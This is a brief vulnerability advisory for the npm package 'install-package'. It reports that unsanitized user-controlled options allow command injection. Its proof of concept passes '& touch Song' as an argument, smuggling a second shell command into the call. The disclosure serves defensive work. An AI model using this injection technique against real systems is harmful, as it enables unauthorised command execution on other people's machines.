# Overview
install-package is a package that installs node modules from JavaScript.
Affected versions of this package are vulnerable to Command Injection.
The argument options can be controlled by users without any sanitization.

# Proof of Concept
var root = require("install-package");
root("", "& touch Song");
